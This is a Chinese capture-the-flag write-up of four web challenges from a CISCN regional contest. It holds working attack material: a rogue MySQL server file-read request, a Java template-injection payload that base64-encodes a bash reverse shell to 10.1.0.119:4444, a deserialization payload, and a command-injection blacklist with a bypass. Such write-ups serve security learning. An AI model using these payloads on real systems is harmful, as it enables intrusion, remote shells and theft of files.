# CISCN西南赛区 WebWriteUp

  
  
&lt;!--more--&gt;  
## weblog  
`/article.php?id=1`存在`sql`注入，注入数据  
找到隐藏路径，可以连接数据库，进行mysql fakeserver任意文件读取  
`/database.php`  
```http  
POST /database.php HTTP/1.1  
Host: 10.1.0.122:82  
Content-Length: 123  
Cache-Control: max-age=0  
Upgrade-Insecure-Requests: 1  
Origin: http://10.1.0.122:82  
Content-Type: application/x-www-form-urlencoded  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36  
Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Referer: http://10.1.0.122:82/hide/connect_fun_dbs_test_hides.php  
Accept-Encoding: gzip, deflate, br  
Accept-Language: zh-CN,zh;q=0.9  
Connection: close  
  
jsonData={&#34;host&#34;:&#34;10.1.0.130&#34;,&#34;port&#34;:3306,&#34;username&#34;:&#34;root&#34;,&#34;password&#34;:&#34;password&#34;}  
```  
读取`flag`文件，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171009709.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171009598.png)
## ezssti  
访问`/hello`点击连接跳转`/destiny`  
直接打ssti  
```java  
%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22bash&#43;-c&#43;{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEuMC4xMTkvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}%22)  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171009744.png)
成功反弹`shell`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171010274.png)
## zwxajavaf  
`/backup.zip`下载源码  
存在反序列化  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171011712.png)
直接上传序列化的文件即可，  
利用点  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171011212.png)
payload  
```java  
package com.example.zwxajavaf1;  
  
import java.io.FileOutputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
  
public class JavaPayload{  
    public static void main(String[] args) throws Exception{  
        MyCustomObject myCustomObject = new MyCustomObject();  
        setFieldValue(myCustomObject,&#34;filePath&#34;,&#34;/usr/local/tomcat/webapps/admin_info.txt&#34;);  
        serialize(myCustomObject);  
    }  
    public static void serialize(Object o) throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;ser.bin&#34;));  
        oos.writeObject(o);  
    }  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
}  
```  
上传后得到密码  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171012916.png)
反序列化之后得到密码  
登陆后`rce`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171012248.png)
## ssrf2rce  
访问`/flag.php`  
```  
flag{th1s_is_f4ke_flag}  
  
  
  
  
But,there is something in coooooomand.php~!!  
```  
访问`coooooomand.php`  
```php  
&lt;?php  
function executeCommand($command) {  
    if (preg_match(&#39;/cat| |\\\\|\${IFS}|%09|\$[*@x]|tac|iconv|shuf|comm|bat|more|less|nl|od|sed|awk|perl|python|ruby|xxd|hexdump|string/&#39;, $command)) {  
        return &#34;Hacker!!!&#34;;  
    }  
  
    $output = shell_exec($command);  
    if ($output === null) {  
        return &#34;uhhhh&#34;;  
    }  
  
    return $output;  
}  
  
$command = isset($_GET[&#39;command&#39;]) ? $_GET[&#39;command&#39;] : &#39;&#39;;  
  
if (!empty($command)) {  
    $result = executeCommand($command);  
    echo nl2br(htmlspecialchars($result, ENT_QUOTES, &#39;UTF-8&#39;));  
} else {  
    echo highlight_file(__FILE__, true);  
}  
?&gt;  
```  
进行绕过`/coooooomand.php?command=/bin/ca?$IFS/flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406171013698.png)
# fix？？？  
fix ctf rce 绕过 Orz  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/  

